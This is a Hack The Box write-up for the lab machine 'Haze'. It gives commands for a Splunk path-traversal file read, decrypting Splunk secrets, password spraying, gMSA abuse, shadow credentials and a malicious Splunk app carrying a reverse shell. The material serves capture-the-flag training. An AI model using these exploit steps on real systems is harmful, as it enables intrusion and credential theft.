**Haze** is a Hard-rated machine on Hack The Box that requires multiple steps for exploitation. The initial foothold is gained through a vulnerable Splunk instance that allows local file read via a known CVE. Using this, we extract credentials and proceed to privilege escalation via LDAP abuse, shadow credentials, and a Splunk privilege escalation technique.

# Recon

### Port Scan

```
# Nmap 7.95 scan initiated...
```

As we can see, this is an Active Directory environment, likely a Domain Controller, as shown in the SSL certificate and services. From the cert, we can identify the hostname `dc01.haze.htb`, which we’ll add to our `/etc/hosts`:

```
10.10.11.61 dc01 dc01.haze.htb haze.htb
```

Checking port 8000 reveals a web interface running Splunk:

![](/assets/posts/Haze/Haze.png)

# Exploitation

## CVE-2024-36991 - Splunk Local File Read

By accessing `https://haze.htb:8089`, we identify the Splunk version as 9.2.1, which is vulnerable to [CVE-2024-36991](https://nvd.nist.gov/vuln/detail/CVE-2024-36991), a local file read vulnerability.

### PoC:

```bash
curl "http://haze.htb:8000/en-US/modules/messaging/C:../.../C:/Program%20Files/Splunk/etc/passwd"
```

This leaks hashed credentials:

```
:admin:...
:edward:...
:mark:...
:paul:...
```

Password cracking didn't work, so I read additional config files:

```bash
curl "http://haze.htb:8000/.../splunk.secret"
curl "http://haze.htb:8000/.../authentication.conf"
```

From the `authentication.conf`:

```
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYi...
```

Using the Splunk secret, we decrypted the password using `splunksecrets`:

```bash
splunksecrets splunk-decrypt -S splunk.secret
# Output: Ld@p_Auth_Sp1unk@2k24
```

### Credentials:
```
paul.taylor : Ld@p_Auth_Sp1unk@2k24
```

## User Access

Enumerate users via RID brute-forcing:

```bash
netexec smb haze.htb -u paul.taylor -p Ld@p_Auth_Sp1unk@2k24 --rid-brute
```

Then spray the password across all usernames:

```bash
netexec smb haze.htb -u users -p Ld@p_Auth_Sp1unk@2k24 --continue-on-success
```

Success:
```
mark.adams : Ld@p_Auth_Sp1unk@2k24
```

### WinRM Access

```bash
netexec winrm haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24
```

Inside, we find the user is part of `gMSA_Managers`, suggesting they can manage Group Managed Service Accounts.

### Dumping gMSA Account

```bash
netexec ldap haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --gmsa
```

We learn:
```
Account: Haze-IT-Backup$ 
NTLM: <no read permissions>
PrincipalsAllowedToReadPassword: Domain Admins
```

We enable read permissions via GUI or PowerView. After that:

```bash
bloodhound-python --collectionmethod All --username 'Haze-IT-Backup$' --hashes aad3...:4de830... --dc dc01.haze.htb --domain haze.htb -ns 10.10.11.61 --zip
```

Upload data to BloodHound. We find a path to `edward.martin` via `WriteOwner`, `GenericAll`, and group membership.

## Shadow Credentials

We **can’t change Edward’s password** due to minimum password age. Instead, we use **shadow credentials** via `bloodyAD`:

```bash
bloodyAD --host 10.10.11.61 -d haze.htb -u 'Haze-IT-Backup$' -p ':<NTLM>' add shadowCredentials edward.martin
```

It generates a cert and key. Convert them into `.pfx`:

```bash
openssl pkcs12 -export -out login.pfx -inkey *_priv.pem -in *_cert.pem
```

Then authenticate with Certipy:

```bash
certipy auth -pfx login.pfx -u edward.martin -domain haze.htb -dc-ip 10.10.11.61
```

Success! We dump the NT hash.

## Root

As Edward, we can access `C:\Backups\`, which contains a Splunk backup. Inside:

```
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
```

The password is legacy encrypted. Use:

```bash
splunksecrets splunk-legacy-decrypt -S splunk.secret
# Output: Sp1unkadmin@2k24
```

Login to Splunk UI with:
```
admin : Sp1unkadmin@2k24
```

We can now install a malicious Splunk app:

1. Modify `run.ps1` to include reverse shell
2. Create `.spl` file:
   ```bash
   tar -czf app.tgz app_dir
   mv app.tgz malicious.spl
   ```
3. Upload via the Splunk App interface
